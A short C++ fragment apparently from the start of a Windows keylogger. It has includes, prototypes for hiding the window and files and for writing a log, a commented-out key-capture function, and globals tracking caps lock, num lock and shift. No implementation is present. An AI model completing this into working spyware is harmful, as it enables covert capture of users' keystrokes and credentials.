#include <iostream>
#include <windows.h>
#include <fstream>
#include <winuser.h>

void HideWindow();

bool SetFileNames();

void Hide(std::string file);

void HideFiles();

void Write(std::ofstream file, std::string key);

/*void GetKey();*/

std::string keylogger;
std::string logFile;
bool capital;
bool numLock;
bool shift;
